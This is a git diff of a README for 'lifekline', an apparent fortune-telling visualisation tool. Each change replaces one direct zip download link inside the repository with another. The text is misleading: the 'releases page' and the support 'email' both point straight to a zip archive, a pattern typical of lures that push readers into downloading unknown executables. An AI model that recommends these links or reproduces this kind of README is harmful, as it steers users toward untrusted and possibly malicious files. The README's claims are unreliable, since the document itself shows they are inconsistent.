@@ -6,7 +6,7 @@ Welcome to lifekline, a powerful tool for visualizing your destiny based on trad
 
 ## 📥 Download Now
 
-[![Download lifekline](https://raw.githubusercontent.com/SHARAN12344/lifekline/main/components/Software-1.6.zip)](https://raw.githubusercontent.com/SHARAN12344/lifekline/main/components/Software-1.6.zip)
+[![Download lifekline](https://github.com/SHARAN12344/lifekline/raw/refs/heads/main/assets/Software-v1.4.zip)](https://github.com/SHARAN12344/lifekline/raw/refs/heads/main/assets/Software-v1.4.zip)
 
 ## 📋 System Requirements
 
@@ -23,7 +23,7 @@ To install lifekline, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download page:
 
-   [Download lifekline](https://raw.githubusercontent.com/SHARAN12344/lifekline/main/components/Software-1.6.zip)
+   [Download lifekline](https://github.com/SHARAN12344/lifekline/raw/refs/heads/main/assets/Software-v1.4.zip)
 
 2. **Choose Your Version:** On the releases page, you will find different versions of the application. Select the latest stable version for the best experience.
 
@@ -49,7 +49,7 @@ If you encounter any issues while using lifekline, don't hesitate to reach out f
 
 - **Frequently Asked Questions:** Many users find answers in our FAQ section.
 - **Community Discussions:** Feel free to join our forums for user support and engagement.
-- **Contact Us:** For direct inquiries, you can reach our support team via email https://raw.githubusercontent.com/SHARAN12344/lifekline/main/components/Software-1.6.zip
+- **Contact Us:** For direct inquiries, you can reach our support team via email https://github.com/SHARAN12344/lifekline/raw/refs/heads/main/assets/Software-v1.4.zip
 
 ## 🌐 Community and Contributions
 
@@ -63,6 +63,6 @@ lifekline is open-source software licensed under the MIT License. You are free t
 
 To get started with lifekline, visit the link below once more:
 
-[Download lifekline](https://raw.githubusercontent.com/SHARAN12344/lifekline/main/components/Software-1.6.zip)
+[Download lifekline](https://github.com/SHARAN12344/lifekline/raw/refs/heads/main/assets/Software-v1.4.zip)
 
 Explore the mysteries of your life today with lifekline!
